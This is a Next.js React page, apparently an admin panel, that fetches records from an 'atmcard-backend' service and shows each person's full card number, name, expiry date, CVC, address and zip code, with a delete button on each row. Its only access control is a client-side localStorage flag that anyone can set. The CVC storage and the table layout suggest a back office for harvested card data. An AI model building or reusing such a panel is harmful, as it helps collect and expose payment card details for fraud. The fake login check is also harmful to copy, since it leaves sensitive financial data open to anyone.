"use client";
import React, { useEffect, useState } from "react";
import "bootstrap/dist/css/bootstrap.min.css";
import toast, { Toaster } from "react-hot-toast";
import { usePathname, useRouter } from "next/navigation";

const page = () => {
  //https://atmcard-backend.onrender.com/users
  //https://atmcard-backend.onrender.com/delete/${id}

  const [data, setData] = useState([]);

  const router = useRouter();

  useEffect(() => {
    // Check if user is logged in
    const isLoggedIn = localStorage.getItem('isLoggedIn');
    if (!isLoggedIn) {
      // If not logged in, redirect to login page
      router.push('/login');
    }
  }, []);


  useEffect(() => {
    fetchItems();
  }, []); // Fetch items when the component mounts

  const fetchItems = async () => {
    try {
      const response = await fetch("https://atmcard-backend.onrender.com/users");
      const data = await response.json();
      setData(data); // Set the fetched items into state
    } catch (error) {
      console.error("Error fetching items:", error);
    }
  };

  const handleDelete = async (id) => {
    try {
      const response = await fetch(`https://atmcard-backend.onrender.com/delete/${id}`, {
        method: "DELETE",
      });
      // After deletion, fetch updated items

      if (response.ok) {
        // Display loading message for 2 seconds
        toast.promise(
          new Promise((resolve) => {
            setTimeout(() => resolve(response), 1000); // 2-second delay
          }),
          {
            loading: "Loading",
            success: (data) => {
              // Clear all input fields
              fetchItems();
              return `Successfully Deleted `;
            },
            error: (err) => `This just happened: ${err.toString()}`,
          },
          {
            style: {
              minWidth: "250px",
            },
            success: {
              duration: 1500,
              icon: "🔥",
            },
          }
        );
      } else {
        // Display error message if response is not OK
        throw new Error(`Failed to save: ${response.statusText}`);
      }

    } catch (error) {
      console.error("Error deleting item:", error);
    }
  };

  const tableRows = data.map((user, index) => (
    <tr key={user._id}>
      <td>{index + 1}</td>
      <td>{user.number}</td> {/* Displaying the 'number' property */}
      <td>{user.name}</td> {/* Placeholder, replace with actual user data */}
      <td>{user.expiry}</td>
      <td>{user.cvc}</td> {/* Placeholder, replace with actual user data */}
      <td>{user.address}</td>
      <td>{user.zip}</td>
      <td className="cursor p-2 border button" onClick={() => handleDelete(user._id)}>
        Delete
      </td>
    </tr>
  ));

  return (
    <div>
      <h3 className="text-center title">All Users</h3>

      <table class="table">
        <thead>
          <tr>
            <th scope="col">List</th>
            <th scope="col">Card Number</th>
            <th scope="col">Name</th>
            <th scope="col">Date</th>
            <th scope="col">cvc</th>
            <th scope="col">Address</th>
            <th scope="col">Zip Code </th>
            <th scope="col">Setting </th>
          </tr>
        </thead>
        <tbody>{tableRows}</tbody>
      </table>
      <Toaster />
    </div>
  );
};

export default page;
